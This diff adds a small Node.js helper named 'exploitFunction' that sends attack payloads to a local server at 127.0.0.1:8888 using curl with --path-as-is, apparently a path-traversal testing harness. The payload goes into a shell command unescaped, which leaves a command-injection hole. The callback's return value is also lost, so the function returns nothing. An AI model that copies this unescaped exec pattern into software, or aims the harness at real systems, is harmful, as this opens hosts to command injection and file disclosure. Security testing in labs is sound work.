@@ -1,0 +1,16 @@
+function exploitFunction(payload) {
+  const { exec } = require("child_process");
+  const fs = require("fs");
+
+  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
+
+  exec(attack_string, (error, stdout) => {
+    if (error) {
+      console.error(`Error executing ${attack_string}: ${error}`);
+      return;
+    }
+    return stdout;
+  });
+}
+
+module.exports = { exploitFunction };
